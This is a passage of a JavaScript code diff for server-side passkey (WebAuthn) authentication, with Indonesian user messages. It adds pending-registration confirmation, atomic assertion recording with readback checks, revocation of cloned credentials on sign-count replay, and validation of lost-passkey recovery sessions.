+      || pendingRow.backup_state !== (registration.backupState === true)
+      || pendingRow.confirmed_at || pendingRow.activated_at || pendingRow.revoked_at
+      || !Number.isFinite(pendingExpiryReadbackMs)
+      || Math.abs(pendingExpiryReadbackMs - pendingExpiresAtMs) > 1
+      || pendingExpiryReadbackMs <= Date.now()
+      || !storedBinding.ok
+      || !safeEqual(storedBinding.keyId, deviceBinding.keyId)
+      || !diracPasskeyA2FOwnerMatches(pendingRow, owner)) {
+    return { ok: false, status: 503, message: 'Postcondition Passkey pending tidak dapat dibuktikan.', code: 'PASSKEY_PENDING_POSTCONDITION_FAILED' };
+  }
+
+  const confirmation = await diracPasskeyA2FCreatePendingConfirmationV237({
+    owner,
+    pendingRow,
+    payload,
+    req,
+    deviceBindingKeyId: deviceBinding.keyId
+  });
+  if (!confirmation.ok || !confirmation.confirmationResponse) {
+    return {
+      ok: false,
+      status: confirmation.status || 503,
+      message: 'Challenge konfirmasi Passkey pending tidak dapat dibentuk.',
+      code: confirmation.code || 'PASSKEY_CONFIRMATION_CHALLENGE_FAILED'
+    };
+  }
+
+  return {
+    ok: true,
+    created: false,
+    pendingCreated: true,
+    confirmationRequired: true,
+    confirmationResponse: confirmation.confirmationResponse,
+    row: pendingRow,
+    deviceBindingVerified: true,
+    deviceBindingKeyId: deviceBinding.keyId,
+    rotationId
+  };
 }
 
-async function diracPasskeyA2FUpdateUsage({ row, owner, response, credential, clientData, payload, req }) {
-  if (!row || !row.id || !diracPasskeyA2FOwnerMatches(row, owner)) {
+
+async function diracPasskeyA2FConfirmPendingRegistrationV237({ row, owner, response, credential, clientData, payload, req, body, setupToken }) {
+  const credentialId = diracPasskeyA2FCredentialId(credential);
+  const passkeyId = String(row && row.id || '');
+  const rotationId = String(row && row.rotation_id || '');
+  const rotationPurpose = String(row && row.rotation_purpose || '');
+  const currentAuthSessionId = diracPasskeyA2FCurrentSessionRequiredV237(req, owner);
+  const expectedSecurityEpoch = diracPasskeyA2FExpectedEpochV237(payload);
+  const previousSignCount = Number(row && row.sign_count);
+  const pendingExpiresAtMs = Date.parse(String(row && row.pending_expires_at || ''));
+  const credentialIdHash = crypto.createHash('sha256').update(String(credentialId || '')).digest('hex');
+  const storedBinding = diracPasskeyA2FStoredDeviceBinding(row);
+
+  if (!credentialId
+      || !customerSecurityLooksLikeUuid(passkeyId)
+      || !customerSecurityLooksLikeUuid(rotationId)
+      || !customerSecurityLooksLikeUuid(currentAuthSessionId)
+      || !['initial', 'replace', 'recovery'].includes(rotationPurpose)
+      || !Number.isSafeInteger(expectedSecurityEpoch) || expectedSecurityEpoch < 1
+      || !Number.isSafeInteger(previousSignCount) || previousSignCount < 0
+      || !Number.isFinite(pendingExpiresAtMs) || pendingExpiresAtMs <= Date.now()
+      || !storedBinding.ok
+      || String(payload && payload.mode || '') !== 'confirm_pending'
+      || String(payload && payload.assertionPurpose || '') !== DIRAC_PASSKEY_ASSERTION_PURPOSE_CONFIRM_PENDING_V237
+      || !safeEqual(String(payload && payload.pendingPasskeyId || ''), passkeyId)
+      || !safeEqual(String(payload && payload.pendingCredentialId || ''), credentialId)
+      || !safeEqual(String(payload && payload.pendingCredentialIdHash || ''), credentialIdHash)
+      || Number(payload && payload.previousSignCount) !== previousSignCount
+      || !safeEqual(String(payload && payload.rotationId || ''), rotationId)
+      || String(payload && payload.rotationPurpose || '') !== rotationPurpose
+      || !safeEqual(String(payload && payload.currentAuthSessionId || ''), currentAuthSessionId)
+      || !safeEqual(String(payload && payload.publicKeySha256 || ''), String(row && row.public_key_sha256 || ''))
+      || !safeEqual(String(payload && payload.deviceBindingKeyId || ''), storedBinding.keyId)
+      || Number(payload && payload.pendingExpiresAtMs) !== pendingExpiresAtMs
+      || row.is_active !== false
+      || String(row.rotation_state || '') !== 'pending'
+      || row.credential_epoch == null || Number(row.credential_epoch) !== 0
+      || Number(row.expected_security_epoch || 0) !== expectedSecurityEpoch
+      || !safeEqual(String(row.current_auth_session_id || ''), currentAuthSessionId)
+      || row.confirmed_at || row.activated_at || row.revoked_at
+      || !diracPasskeyA2FOwnerMatches(row, owner)) {
+    return { ok: false, status: 409, message: 'Kontrak Passkey pending berubah atau tidak valid.', code: 'PASSKEY_CONFIRM_PENDING_CONTEXT_INVALID' };
+  }
+
+  const assertion = diracPasskeyA2FValidateAuthenticationResponse({ row, response, payload, clientData, req });
+  if (!assertion.ok) {
+    return {
+      ok: false,
+      status: 403,
+      message: assertion.reason === 'passkey_backup_flags_invalid'
+        || assertion.reason === 'passkey_backup_eligibility_changed'
+        || assertion.reason === 'stored_passkey_backup_policy_missing'
+        ? 'Status backup Passkey pending berubah atau tidak valid.'
+        : 'Signature konfirmasi Passkey pending tidak valid.',
+      code: assertion.reason || 'PASSKEY_CONFIRM_PENDING_SIGNATURE_INVALID'
+    };
+  }
+
+  const deviceBinding = diracPasskeyA2FValidateAuthenticationDeviceBinding({
+    row,
+    body,
+    setupToken,
+    payload,
+    credentialId
+  });
+  if (!deviceBinding.ok || !safeEqual(deviceBinding.keyId, storedBinding.keyId)) {
+    return {
+      ok: false,
+      status: 403,
+      message: 'Binding perangkat untuk konfirmasi Passkey pending tidak cocok.',
+      code: String(deviceBinding.reason || 'PASSKEY_CONFIRM_PENDING_DEVICE_BINDING_INVALID').toUpperCase()
+    };
+  }
+
+  const signCount = Math.max(0, Number(assertion.signCount || diracPasskeyA2FSignCount(response) || 0));
+  if (!Number.isSafeInteger(signCount)
+      || ((previousSignCount > 0 || signCount > 0) && signCount <= previousSignCount)) {
+    return { ok: false, status: 403, message: 'Counter konfirmasi Passkey pending tidak meningkat secara sah.', code: 'PASSKEY_CONFIRM_PENDING_COUNTER_INVALID' };
+  }
+
+  const nowIso = new Date().toISOString();
+  const currentCredentialJson = row.credential_json && typeof row.credential_json === 'object' ? row.credential_json : {};
+  const updatedCredentialJson = {
+    ...currentCredentialJson,
+    webauthn: {
+      ...(currentCredentialJson.webauthn && typeof currentCredentialJson.webauthn === 'object' ? currentCredentialJson.webauthn : {}),
+      sign_count: signCount,
+      backup_state: assertion.backupState === true,
+      last_verified_at: nowIso
+    },
+    last_authentication: diracPasskeyA2FMinimalCredentialJson({
+      credential,
+      response,
+      clientData,
+      payload,
+      owner,
+      req,
+      mode: 'confirm_pending'
+    })
+  };
+
+  const recorded = await diracPasskeyA2FRpcV237('dirac_passkey_record_assertion_v237', {
+    p_customer_id: String(owner.customerId),
+    p_passkey_id: passkeyId,
+    p_expected_sign_count: previousSignCount,
+    p_new_sign_count: signCount,
+    p_backup_state: assertion.backupState === true,
+    p_credential_json: updatedCredentialJson,
+    p_confirm_pending: true,
+    p_auth_user_id: String(owner.authUserId),
+    p_assertion_purpose: DIRAC_PASSKEY_ASSERTION_PURPOSE_CONFIRM_PENDING_V237,
+    p_rotation_id: rotationId,
+    p_expected_security_epoch: expectedSecurityEpoch,
+    p_current_auth_session_id: currentAuthSessionId
+  });
+  if (!recorded.ok) {
+    console.error('[passkey-confirm-pending-assertion-rpc-failed]', {
+      status: Number(recorded.status || 0),
+      provider_code: diracPasskeyA2FRpcProviderCodeV237(recorded)
+    });
+    return { ok: false, status: recorded.status || 409, message: 'Konfirmasi Passkey pending ditolak oleh transaksi atomik.', code: 'PASSKEY_CONFIRM_PENDING_ASSERTION_RPC_FAILED' };
+  }
+  const recordedData = diracPasskeyA2FRpcDataObjectV237(recorded);
+  if (!recordedData || recordedData.ok !== true
+      || !safeEqual(String(recordedData.passkey_id || ''), passkeyId)
+      || String(recordedData.rotation_state || '') !== 'pending'
+      || recordedData.confirmed !== true) {
+    return { ok: false, status: 503, message: 'Bukti RPC pending_confirmed tidak valid.', code: 'PASSKEY_CONFIRM_PENDING_RPC_POSTCONDITION_FAILED' };
+  }
+
+  const confirmedReadback = await diracPasskeyA2FFetchCredentialStateV237({
+    owner,
+    credentialId,
+    rotationId,
+    passkeyId
+  });
+  const confirmedRows = confirmedReadback.ok && Array.isArray(confirmedReadback.data) ? confirmedReadback.data : [];
+  const confirmedRow = confirmedRows.length === 1 ? confirmedRows[0] : null;
+  if (!confirmedRow
+      || confirmedRow.is_active !== false
+      || String(confirmedRow.rotation_state || '') !== 'pending'
+      || String(confirmedRow.rotation_purpose || '') !== rotationPurpose
+      || confirmedRow.credential_epoch == null || Number(confirmedRow.credential_epoch) !== 0
+      || Number(confirmedRow.expected_security_epoch || 0) !== expectedSecurityEpoch
+      || confirmedRow.sign_count == null || Number(confirmedRow.sign_count) !== signCount
+      || confirmedRow.backup_state !== (assertion.backupState === true)
+      || !safeEqual(String(confirmedRow.rotation_id || ''), rotationId)
+      || !safeEqual(String(confirmedRow.current_auth_session_id || ''), currentAuthSessionId)
+      || !safeEqual(String(confirmedRow.public_key_sha256 || ''), String(row.public_key_sha256 || ''))
+      || !confirmedRow.confirmed_at || confirmedRow.activated_at || confirmedRow.revoked_at
+      || Date.parse(String(confirmedRow.pending_expires_at || '')) <= Date.now()
+      || !diracPasskeyA2FOwnerMatches(confirmedRow, owner)) {
+    return { ok: false, status: 503, message: 'Postcondition confirmed_at Passkey pending tidak dapat dibuktikan.', code: 'PASSKEY_CONFIRM_PENDING_READBACK_FAILED' };
+  }
+
+  const recoveryRequestId = confirmedRow.recovery_request_id ? String(confirmedRow.recovery_request_id) : null;
+  const recoverySessionId = confirmedRow.recovery_session_id ? String(confirmedRow.recovery_session_id) : null;
+  const recoverySessionHash = confirmedRow.recovery_session_hash ? String(confirmedRow.recovery_session_hash) : null;
+  const authorizingCredentialIdHash = /^[a-f0-9]{64}$/.test(String(confirmedRow.authorizing_credential_id_hash || ''))
+    ? String(confirmedRow.authorizing_credential_id_hash)
+    : null;
+
+  const finalized = await diracPasskeyA2FRpcV237('dirac_passkey_finalize_rotation_v237', {
+    p_customer_id: String(owner.customerId),
+    p_auth_user_id: String(owner.authUserId),
+    p_rotation_id: rotationId,
+    p_pending_passkey_id: passkeyId,
+    p_rotation_purpose: rotationPurpose,
+    p_expected_security_epoch: expectedSecurityEpoch,
+    p_authorizing_credential_id_hash: authorizingCredentialIdHash,
+    p_current_auth_session_id: currentAuthSessionId,
+    p_recovery_request_id: recoveryRequestId,
+    p_recovery_session_id: recoverySessionId,
+    p_recovery_session_hash: recoverySessionHash
+  });
+  if (!finalized.ok) {
+    console.error('[passkey-finalize-rotation-rpc-failed]', {
+      status: Number(finalized.status || 0),
+      provider_code: diracPasskeyA2FRpcProviderCodeV237(finalized)
+    });
+    return { ok: false, status: finalized.status || 500, message: 'Gagal mengaktifkan rotasi Passkey setelah konfirmasi.', code: 'PASSKEY_FINALIZE_ROTATION_RPC_FAILED' };
+  }
+  const finalizedData = diracPasskeyA2FRpcDataObjectV237(finalized);
+  const finalizedSecurityEpoch = Number(finalizedData && finalizedData.security_epoch);
+  if (!finalizedData || finalizedData.ok !== true
+      || !Number.isSafeInteger(finalizedSecurityEpoch)
+      || finalizedSecurityEpoch !== expectedSecurityEpoch + 1
+      || Number(finalizedData.active_credentials) !== 1) {
+    return { ok: false, status: 503, message: 'Bukti commit rotasi Passkey tidak valid.', code: 'PASSKEY_FINALIZE_RPC_POSTCONDITION_FAILED' };
+  }
+
+  const activeReadback = await diracPasskeyA2FFetchCredentialStateV237({
+    owner,
+    credentialId,
+    rotationId,
+    passkeyId,
+    activeOnly: true
+  });
+  const activeRows = activeReadback.ok && Array.isArray(activeReadback.data) ? activeReadback.data : [];
+  const activeRow = activeRows.length === 1 ? activeRows[0] : null;
+  const allActiveRows = await diracPasskeyA2FListActivePasskeys(owner, true);
+  const finalBinding = diracPasskeyA2FStoredDeviceBinding(activeRow);
+  if (!activeRow || activeRow.is_active !== true
+      || String(activeRow.rotation_state || '') !== 'active'
+      || String(activeRow.rotation_purpose || '') !== rotationPurpose
+      || !safeEqual(String(activeRow.rotation_id || ''), rotationId)
+      || Number(activeRow.credential_epoch || 0) !== finalizedSecurityEpoch
+      || !activeRow.confirmed_at || !activeRow.activated_at
+      || activeRow.pending_expires_at || activeRow.revoked_at
+      || activeRow.sign_count == null || Number(activeRow.sign_count) !== signCount
+      || allActiveRows.length !== 1
+      || !safeEqual(String(allActiveRows[0] && allActiveRows[0].id || ''), String(activeRow.id || ''))
+      || !finalBinding.ok
+      || !safeEqual(finalBinding.keyId, deviceBinding.keyId)
+      || !diracPasskeyA2FOwnerMatches(activeRow, owner)) {
+    return { ok: false, status: 503, message: 'Status aktif Passkey setelah konfirmasi tidak dapat dibuktikan.', code: 'PASSKEY_FINAL_STATE_POSTCONDITION_FAILED' };
+  }
+
+  return {
+    ok: true,
+    created: true,
+    row: activeRow,
+    securityEpoch: finalizedSecurityEpoch,
+    deviceBindingVerified: true,
+    deviceBindingKeyId: deviceBinding.keyId,
+    rotationId
+  };
+}
+
+async function diracPasskeyA2FUpdateUsage({ row, owner, response, credential, clientData, payload, req, body, setupToken }) {
+  if (!row || !customerSecurityLooksLikeUuid(String(row.id || '')) || !diracPasskeyA2FOwnerMatches(row, owner)) {
     return { ok: false, status: 403, message: 'Passkey tidak cocok dengan akun login ini.' };
   }
   const assertion = diracPasskeyA2FValidateAuthenticationResponse({ row, response, payload, clientData, req });
   if (!assertion.ok) {
-    return { ok: false, status: 403, message: 'Signature Passkey tidak valid.', code: assertion.reason || 'PASSKEY_SIGNATURE_INVALID' };
+    if (assertion.reason === 'passkey_sign_count_replay') {
+      const revoked = await diracPasskeyA2FRevokeCloneV237({ row, owner, assertion, req });
+      return {
+        ok: false,
+        status: revoked.ok ? 403 : (revoked.status || 503),
+        message: revoked.ok
+          ? 'Counter Passkey terdeteksi replay. Credential telah dicabut dan autentikasi ditolak.'
+          : 'Counter Passkey terdeteksi replay dan pencabutan atomik belum dapat dibuktikan. Autentikasi ditolak.',
+        code: revoked.ok ? 'PASSKEY_CLONE_REVOKED' : (revoked.code || 'PASSKEY_CLONE_REVOCATION_FAILED')
+      };
+    }
+    return {
+      ok: false,
+      status: 403,
+      message: assertion.reason === 'passkey_backup_flags_invalid'
+        || assertion.reason === 'passkey_backup_eligibility_changed'
+        || assertion.reason === 'stored_passkey_backup_policy_missing'
+        ? 'Status backup Passkey berubah atau tidak valid.'
+        : 'Signature Passkey tidak valid.',
+      code: assertion.reason || 'PASSKEY_SIGNATURE_INVALID'
+    };
   }
+  const deviceBinding = diracPasskeyA2FValidateAuthenticationDeviceBinding({
+    row,
+    body,
+    setupToken,
+    payload,
+    credentialId: String(row.credential_id || '')
+  });
+  if (!deviceBinding.ok) {
+    return {
+      ok: false,
+      status: 403,
+      message: 'Passkey valid, tetapi binding perangkat pendaftar tidak cocok.',
+      code: String(deviceBinding.reason || 'DEVICE_BINDING_AUTHENTICATION_INVALID').toUpperCase()
+    };
+  }
+
+  const expectedSecurityEpoch = diracPasskeyA2FExpectedEpochV237(payload);
+  const currentAuthSessionId = diracPasskeyA2FCurrentSessionRequiredV237(req, owner);
+  const previousSignCount = Math.max(0, Number(row.sign_count || 0));
   const signCount = Math.max(0, Number(assertion.signCount || diracPasskeyA2FSignCount(response) || 0));
+  if (expectedSecurityEpoch < 0 || !currentAuthSessionId
+      || !Number.isSafeInteger(previousSignCount) || !Number.isSafeInteger(signCount)
+      || signCount < previousSignCount) {
+    return { ok: false, status: 503, message: 'Konteks assertion Passkey tidak valid.', code: 'PASSKEY_ASSERTION_CONTEXT_INVALID' };
+  }
+
   const nowIso = new Date().toISOString();
-  const body = {
-    last_used_at: nowIso,
-    updated_at: nowIso,
-    is_active: true
-  };
-  if (signCount > 0) body.sign_count = signCount;
-  body.credential_json = {
-    ...(row.credential_json && typeof row.credential_json === 'object' ? row.credential_json : {}),
+  const currentCredentialJson = row.credential_json && typeof row.credential_json === 'object' ? row.credential_json : {};
+  const updatedCredentialJson = {
+    ...currentCredentialJson,
+    webauthn: {
+      ...(currentCredentialJson.webauthn && typeof currentCredentialJson.webauthn === 'object' ? currentCredentialJson.webauthn : {}),
+      backup_eligible: assertion.backupEligible === true,
+      backup_state: assertion.backupState === true,
+      device_bound: assertion.deviceBound === true,
+      sync_policy: 'synced-passkey-device-binding-required-v1'
+    },
+    device_binding: {
+      ...(currentCredentialJson.device_binding && typeof currentCredentialJson.device_binding === 'object' ? currentCredentialJson.device_binding : {}),
+      version: DIRAC_PASSKEY_DEVICE_BINDING_VERSION,
+      algorithm: DIRAC_PASSKEY_DEVICE_BINDING_ALGORITHM,
+      required: true,
+      key_id: deviceBinding.keyId,
+      public_key_jwk: deviceBinding.publicKeyJwk,
+    },
     last_authentication: diracPasskeyA2FMinimalCredentialJson({ credential, response, clientData, payload, owner, req, mode: 'authentication' })
   };
 
-  const patched = await supabaseFetch('/rest/v1/domain_passkeys?id=eq.' + encodeURIComponent(row.id), {
-    method: 'PATCH',
-    auth: 'service',
-    prefer: 'return=representation',
-    body
+  const recorded = await diracPasskeyA2FRpcV237('dirac_passkey_record_assertion_v237', {
+    p_customer_id: String(owner.customerId),
+    p_passkey_id: String(row.id),
+    p_expected_sign_count: previousSignCount,
+    p_new_sign_count: signCount,
+    p_backup_state: assertion.backupState === true,
+    p_credential_json: updatedCredentialJson,
+    p_confirm_pending: false,
+    p_auth_user_id: String(owner.authUserId),
+    p_assertion_purpose: DIRAC_PASSKEY_ASSERTION_PURPOSE_V237,
+    p_rotation_id: null,
+    p_expected_security_epoch: expectedSecurityEpoch,
+    p_current_auth_session_id: currentAuthSessionId
   });
-  if (!patched.ok) {
-    console.error('[passkey-usage-update-failed]', customerSecuritySafeLogError(patched.data));
-    return { ok: false, status: patched.status || 500, message: 'Gagal memperbarui penggunaan Passkey.', code: 'PASSKEY_USAGE_UPDATE_FAILED' };
+  if (!recorded.ok) {
+    console.error('[passkey-record-assertion-rpc-failed]', {
+      status: Number(recorded.status || 0),
+      provider_code: diracPasskeyA2FRpcProviderCodeV237(recorded)
+    });
+    return { ok: false, status: recorded.status || 409, message: 'Assertion Passkey ditolak oleh transaksi atomik.', code: 'PASSKEY_RECORD_ASSERTION_RPC_FAILED' };
   }
-  return { ok: true, row: Array.isArray(patched.data) ? patched.data[0] : patched.data };
+
+  const readback = await diracPasskeyA2FFetchCredentialStateV237({
+    owner,
+    credentialId: String(row.credential_id || ''),
+    passkeyId: String(row.id),
+    activeOnly: true
+  });
+  const rows = readback.ok && Array.isArray(readback.data) ? readback.data : [];
+  const recordedRow = rows.length === 1 ? rows[0] : null;
+  const storedBinding = diracPasskeyA2FStoredDeviceBinding(recordedRow);
+  if (!recordedRow || recordedRow.is_active !== true
+      || String(recordedRow.rotation_state || '') !== 'active'
+      || Number(recordedRow.sign_count || 0) !== signCount
+      || recordedRow.backup_state !== (assertion.backupState === true)
+      || !storedBinding.ok
+      || !safeEqual(String(storedBinding.keyId || ''), String(deviceBinding.keyId || ''))
+      || !safeEqual(String(recordedRow.credential_id || ''), String(row.credential_id || ''))
+      || !diracPasskeyA2FOwnerMatches(recordedRow, owner)) {
+    return { ok: false, status: 503, message: 'Postcondition assertion Passkey tidak dapat dibuktikan.', code: 'PASSKEY_ASSERTION_POSTCONDITION_FAILED' };
+  }
+  return { ok: true, row: recordedRow, deviceBindingVerified: true, deviceBindingKeyId: deviceBinding.keyId };
 }
 
 async function diracPasskeyA2FMarkSettingsActive(owner) {
   try {
-    if (!owner || !owner.customerId || !customerSecurityLooksLikeUuid(owner.customerId)) return { ok: false, reason: 'missing_customer' };
+    if (!owner || !owner.customerId || !customerSecurityLooksLikeUuid(owner.customerId)) {
+      return { ok: false, reason: 'missing_customer' };
+    }
     const existing = await customerSecurityFetchRows(
       'security_customer_settings',
-      ['id', 'customer_id', 'two_factor_enabled', 'two_factor_method'],
+      ['id', 'customer_id', 'two_factor_enabled', 'two_factor_method', 'security_epoch'],
       owner.customerId,
       'created_at.desc',
-      1
+      2
     );
+    const rows = Array.isArray(existing && existing.data) ? existing.data : [];
+    if (rows.length > 1) return { ok: false, reason: 'settings_ambiguous' };
+
     const body = {
       two_factor_enabled: true,
       two_factor_method: 'passkey',
       last_security_check_at: new Date().toISOString()
     };
-    const rows = Array.isArray(existing && existing.data) ? existing.data : [];
     if (rows[0] && rows[0].id) {
-      const patched = await supabaseFetch('/rest/v1/security_customer_settings?id=eq.' + encodeURIComponent(rows[0].id), {
+      const patched = await supabaseFetch('/rest/v1/security_customer_settings?select='
+        + encodeURIComponent('id,customer_id,security_epoch')
+        + '&id=eq.' + encodeURIComponent(rows[0].id)
+        + '&customer_id=eq.' + encodeURIComponent(owner.customerId), {
         method: 'PATCH',
         auth: 'service',
         prefer: 'return=representation',
         body
       });
-      return { ok: Boolean(patched.ok), status: patched.status };
+      const patchedRows = patched.ok && Array.isArray(patched.data) ? patched.data : [];
+      if (patched.ok !== true || patchedRows.length !== 1) {
+        console.error('[dirac-passkey-settings-activation-failed]', {
+          status: Number(patched.status || 0),
+          row_count: patchedRows.length,
+          provider_code: String(
+            patched.data && (patched.data.code || patched.data.error_code) || ''
+          ).slice(0, 80),
+          has_security_epoch: Boolean(patchedRows[0] && patchedRows[0].security_epoch)
+        });
+      }
+      const patchedRow = patchedRows.length === 1 ? patchedRows[0] : null;
+      const securityEpoch = Number(patchedRow && patchedRow.security_epoch || rows[0].security_epoch || 0);
+      return {
+        ok: Boolean(patched.ok) && patchedRows.length === 1
+          && Number.isSafeInteger(securityEpoch) && securityEpoch >= 1,
+        status: patched.status,
+        securityEpoch
+      };
     }
+
     const created = await supabaseFetch('/rest/v1/security_customer_settings', {
       method: 'POST',
       auth: 'service',
       prefer: 'return=representation',
       body: [{ customer_id: owner.customerId, ...body }]
     });
-    return { ok: Boolean(created.ok), status: created.status };
+    const createdRows = created.ok && Array.isArray(created.data) ? created.data : [];
+    const createdRow = createdRows.length === 1 ? createdRows[0] : null;
+    const securityEpoch = Number(createdRow && createdRow.security_epoch || 0);
+    return {
+      ok: Boolean(created.ok) && createdRows.length === 1
+        && Number.isSafeInteger(securityEpoch) && securityEpoch >= 1,
+      status: created.status,
+      securityEpoch
+    };
   } catch (error) {
-    console.error('[dirac-passkey-settings]', error && error.message ? error.message : error);
+    console.error('[dirac-passkey-settings]', diracSecurityRedactDiagnosticV210(error, 180));
     return { ok: false, reason: 'settings_exception' };
   }
+}
+
+
+function diracPasskeyA2FLostRecoveryTokenFromBody(body) {
+  const raw = String(
+    body && (
+      body.recovery_session_token
+      || body.recoverySessionToken
+      || body.lost_passkey_recovery_session_token
+      || body.lostPasskeyRecoverySessionToken
+      || body.dirac_lost_passkey_recovery_session
+    ) || ''
+  ).trim();
+  return /^[A-Za-z0-9_-]{24,256}$/.test(raw) ? raw : '';
+}
+
+function diracPasskeyA2FLostRecoveryPayloadClean(payload) {
+  const recovery = payload && payload.lostPasskeyRecovery && typeof payload.lostPasskeyRecovery === 'object'
+    ? payload.lostPasskeyRecovery
+    : null;
+  if (!recovery) return null;
+  const requestId = customerSecurityNormalizeLostPasskeyRequestId(recovery.requestId || recovery.request_id || '');
+  const sessionHash = String(recovery.sessionHash || recovery.recovery_session_hash || '').trim().toLowerCase();
+  if (!requestId || !/^[a-f0-9]{64}$/.test(sessionHash)) return null;
+  return { requestId, sessionHash };
+}
+
+async function diracPasskeyA2FValidateLostRecoverySession(owner, recoverySessionToken) {
+  const token = diracPasskeyA2FLostRecoveryTokenFromBody({ recovery_session_token: recoverySessionToken });
+  if (!token) return { ok: false, reason: 'lost_passkey_recovery_session_token_invalid' };
+  const sessionHash = customerSecurityLostPasskeyRecoverySessionHash(token);
+  return diracPasskeyA2FValidateLostRecoverySessionHash(owner, { sessionHash });
+}
+
+async function diracPasskeyA2FValidateLostRecoverySessionPayload(owner, payload) {
+  const recovery = diracPasskeyA2FLostRecoveryPayloadClean(payload);
+  if (!recovery) return { ok: false, reason: 'lost_passkey_recovery_session_payload_invalid' };
+  return diracPasskeyA2FValidateLostRecoverySessionHash(owner, recovery);
+}
+
+async function diracPasskeyA2FValidateLostRecoverySessionHash(owner, recovery) {
+  if (!owner || !owner.customerId || !owner.authUserId) {
+    return { ok: false, reason: 'lost_passkey_recovery_owner_missing' };
+  }
+  const sessionHash = String(recovery && recovery.sessionHash || '').trim().toLowerCase();
+  if (!/^[a-f0-9]{64}$/.test(sessionHash)) {
+    return { ok: false, reason: 'lost_passkey_recovery_session_hash_invalid' };
+  }
+
+  const select = 'id,request_id,customer_id,auth_user_id,recovery_session_hash,purpose,status,created_at,expires_at,used_at,revoked_at,metadata';
+  let path = '/rest/v1/' + LOST_PASSKEY_RECOVERY_SESSION_TABLE
+    + '?select=' + encodeURIComponent(select)
+    + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+    + '&auth_user_id=eq.' + encodeURIComponent(owner.authUserId)
+    + '&purpose=eq.' + encodeURIComponent(LOST_PASSKEY_RECOVERY_PURPOSE)
+    + '&status=eq.verified'
+    + '&order=created_at.desc&limit=10';
+  if (recovery && recovery.requestId) {
+    path += '&request_id=eq.' + encodeURIComponent(customerSecurityNormalizeLostPasskeyRequestId(recovery.requestId));
+  }
+
+  const result = await supabaseFetch(path, { method: 'GET', auth: 'service' });
+  if (!result.ok) return { ok: false, status: result.status || 500, reason: 'lost_passkey_recovery_session_read_failed' };
+
+  const rows = Array.isArray(result.data) ? result.data : [];
+  const row = rows.find((item) => item && item.recovery_session_hash && safeEqual(String(item.recovery_session_hash), sessionHash)) || null;
+  if (!row || !row.id) return { ok: false, status: 403, reason: 'lost_passkey_recovery_session_not_found' };
+  if (String(row.customer_id || '') !== String(owner.customerId || '') || String(row.auth_user_id || '') !== String(owner.authUserId || '')) {
+    return { ok: false, status: 403, reason: 'lost_passkey_recovery_session_owner_mismatch' };
+  }
+  if (String(row.purpose || '') !== LOST_PASSKEY_RECOVERY_PURPOSE || String(row.status || '') !== 'verified') {
+    return { ok: false, status: 403, reason: 'lost_passkey_recovery_session_status_invalid' };
+  }
+  if (row.used_at || row.revoked_at) {
+    return { ok: false, status: 403, reason: 'lost_passkey_recovery_session_already_closed' };
+  }
+  const expiresAtMs = Date.parse(row.expires_at || '');
+  if (!Number.isFinite(expiresAtMs) || expiresAtMs <= Date.now()) {
+    return { ok: false, status: 403, reason: 'lost_passkey_recovery_session_expired' };
+  }
+
+  return {
+    ok: true,
+    id: String(row.id),
+    requestId: String(row.request_id || ''),
+    sessionHash,
+    row
+  };
+}
+
+async function diracPasskeyA2FCompleteLostRecoveryRotation({ owner, newCredentialId, recoverySession, req, savedPasskeyRow }) {
+  if (!owner || !owner.customerId || !owner.authUserId || !recoverySession || !recoverySession.ok) {
+    return { ok: false, reason: 'lost_passkey_rotation_context_invalid' };
+  }
+  const credentialId = diracPasskeyA2FSafeString(newCredentialId, 4096);
+  const completed = savedPasskeyRow && savedPasskeyRow.credential_json
+    && savedPasskeyRow.credential_json.lost_passkey_rotation_v235_completed;
+  const legacySecurityEpoch = Number(completed && completed.security_epoch || 0);
+  const legacyCommitProofValid = Boolean(credentialId && completed
+    && completed.version === 'dirac-lost-passkey-rotation-v235'
+    && Number.isSafeInteger(legacySecurityEpoch) && legacySecurityEpoch >= 2
+    && completed.auth_sessions_revoked === true
+    && completed.application_sessions_revoked === true);
+
+  const v237SecurityEpoch = Number(savedPasskeyRow && savedPasskeyRow.credential_epoch || 0);
+  const v237CommitProofValid = Boolean(credentialId
+    && savedPasskeyRow
+    && customerSecurityLooksLikeUuid(String(savedPasskeyRow.id || ''))
+    && diracPasskeyA2FOwnerMatches(savedPasskeyRow, owner)
+    && safeEqual(String(savedPasskeyRow.credential_id || ''), credentialId)
+    && savedPasskeyRow.is_active === true
+    && String(savedPasskeyRow.rotation_state || '') === 'active'
+    && String(savedPasskeyRow.rotation_purpose || '') === DIRAC_PASSKEY_ROTATION_PURPOSE_RECOVERY_V237
+    && customerSecurityLooksLikeUuid(String(savedPasskeyRow.rotation_id || ''))
+    && Number.isSafeInteger(v237SecurityEpoch) && v237SecurityEpoch >= 2
+    && Number(savedPasskeyRow.expected_security_epoch || 0) === v237SecurityEpoch - 1
+    && customerSecurityLooksLikeUuid(String(savedPasskeyRow.current_auth_session_id || ''))
+    && !String(savedPasskeyRow.authorizing_credential_id_hash || '')
+    && safeEqual(String(savedPasskeyRow.recovery_request_id || ''), String(recoverySession.requestId || ''))
+    && safeEqual(String(savedPasskeyRow.recovery_session_id || ''), String(recoverySession.id || ''))
+    && safeEqual(String(savedPasskeyRow.recovery_session_hash || ''), String(recoverySession.sessionHash || ''))
+    && Boolean(savedPasskeyRow.confirmed_at)
+    && Boolean(savedPasskeyRow.activated_at)
+    && !savedPasskeyRow.pending_expires_at
+    && !savedPasskeyRow.revoked_at);
+
+  if (!legacyCommitProofValid && !v237CommitProofValid) {
+    return { ok: false, status: 409, reason: 'lost_passkey_rotation_commit_proof_invalid' };
+  }
+  if (legacyCommitProofValid && v237CommitProofValid && legacySecurityEpoch !== v237SecurityEpoch) {
+    return { ok: false, status: 409, reason: 'lost_passkey_rotation_commit_proof_epoch_mismatch' };
+  }
+  const securityEpoch = v237CommitProofValid ? v237SecurityEpoch : legacySecurityEpoch;
+
+  const activePasskeys = await diracPasskeyA2FListActivePasskeys(owner, true);
+  const activePasskey = activePasskeys.length === 1 ? activePasskeys[0] : null;
+  if (!activePasskey
+      || !safeEqual(String(activePasskey.credential_id || ''), credentialId)
+      || (v237CommitProofValid && (
+        !safeEqual(String(activePasskey.id || ''), String(savedPasskeyRow.id || ''))
+        || !diracPasskeyA2FOwnerMatches(activePasskey, owner)
+        || activePasskey.is_active !== true
+        || String(activePasskey.rotation_state || '') !== 'active'
+        || !safeEqual(String(activePasskey.rotation_id || ''), String(savedPasskeyRow.rotation_id || ''))
+        || Number(activePasskey.credential_epoch || 0) !== securityEpoch
+        || !activePasskey.confirmed_at
+        || !activePasskey.activated_at
+        || activePasskey.revoked_at))) {
